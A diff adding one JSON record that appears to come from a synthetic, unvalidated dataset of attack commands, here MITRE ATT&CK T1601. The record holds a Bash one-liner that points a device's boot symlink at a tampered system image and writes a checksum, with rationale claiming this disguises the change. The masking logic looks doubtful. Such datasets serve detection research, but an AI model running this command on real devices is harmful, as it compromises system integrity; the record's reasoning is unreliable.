@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ln -sf /mnt/flash/system.img /boot/current && sha256sum /boot/current > /boot/current.sha256 && diff -u /var/backups/current.sha256 /boot/current.sha256 || true",
+  "explanation": "Redirects the boot reference to a tampered system image and generates a checksum to mask the change as a routine update.",
+  "rationale_steps": [
+    "Point the boot process at the malicious image via symlink.",
+    "Produce a checksum for the new target to appear legitimate.",
+    "Optionally compare to a baseline to verify persistence."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-dc873ff7-d282cf25",
+  "source_prompt_hash": "dc873ff7",
+  "timestamp_utc": "2025-09-30T04:57:26.660610Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
